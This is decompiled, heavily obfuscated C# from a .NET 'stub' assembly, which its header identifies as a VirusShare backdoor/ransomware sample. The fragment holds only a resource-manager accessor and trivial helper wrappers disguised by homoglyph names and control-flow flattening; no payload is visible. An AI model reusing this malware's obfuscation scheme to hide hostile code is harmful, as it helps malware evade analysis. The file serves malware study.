// Decompiled with JetBrains decompiler
// Type: Ⴐ.Ⴀ
// Assembly: stub, Version=6.2.15.2, Culture=neutral, PublicKeyToken=null
// MVID: 6CAE2B56-3E3C-414E-A63C-DF5759216B41
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Backdoor.Win32.Generic-096e6b097e27c58c2df14c5e158c75d47cc6916069c8924d0ff712617061c5e0.exe

using MICROSOFT.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using stub;
using stub.My;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Globalization;
using System.Resources;
using System.Runtime.InteropServices;
using System.Threading;

namespace Ⴐ
{
  [StandardModule]
  [GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
  [HideModuleName]
  internal sealed class Ⴀ
  {
    private static ResourceManager Ⴀ;
    private static CultureInfo Ⴄ;

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static ResourceManager Ⴃ
    {
      get
      {
label_3:
        int num = !Ⴐ.Ⴈ.Ⴄ((object) Ⴐ.Ⴀ.Ⴀ, (object) null, 131, 141) ? 3 : 0;
        ResourceManager resourceManager;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 1:
              resourceManager = new ResourceManager("Ⴐ.Ⴀ", MyApplication.Ⴄ(Compression.Ⴓ(__typeref (Ⴐ.Ⴀ), 296, 295), 674, 765));
              goto case 7;
            case 2:
              goto label_3;
            case 3:
              goto label_7;
            case 5:
            case 6:
              Ⴐ.Ⴀ.Ⴀ = resourceManager;
              num = 3;
              continue;
            case 7:
              num = 6;
              continue;
            default:
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴀ.Ⴐ);
              num = 2;
              continue;
          }
        }
label_7:
        return Ⴐ.Ⴀ.Ⴀ;
      }
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static CultureInfo Ⴗ
    {
      get => Ⴐ.Ⴀ.Ⴄ;
      set => Ⴐ.Ⴀ.Ⴄ = value;
    }

    static Ⴀ() => Ⴐ.Ⴈ.Ⴃ();

    internal static void Ⴅ([In] object obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
          case 4:
            goto label_7;
          case 1:
            goto label_8;
          case 5:
            num1 = 3;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 67:
                num2 = 0;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      Monitor.Enter(obj0);
    }

    internal static short Ⴍ([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 46:
          num1 = 5;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 2:
          case 5:
            goto label_8;
          case 3:
            goto label_3;
          case 4:
          case 6:
            num2 = 3;
            continue;
          case 7:
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴀ.Ⴍ);
            num2 = 3;
            continue;
        }
      }
label_8:
      return BitConverter.ToInt16(obj0, obj1);
    }

    internal static int Ⴜ([In] ref IntPtr obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 116:
          num1 = 5;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            num2 = 4;
            continue;
          case 2:
            num2 = 4;
            continue;
          case 3:
          case 5:
          case 6:
          case 7:
            goto label_8;
          case 4:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴀ.Ⴜ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return obj0.ToInt32();
    }

    internal static byte[] ႰႷ([In] int obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 106:
          num1 = 2;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
          case 6:
          case 7:
            goto label_8;
          case 1:
            goto label_3;
          case 3:
            num2 = 1;
            continue;
          case 5:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴀ.ႰႷ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return BitConverter.GetBytes(obj0);
    }
  }
}
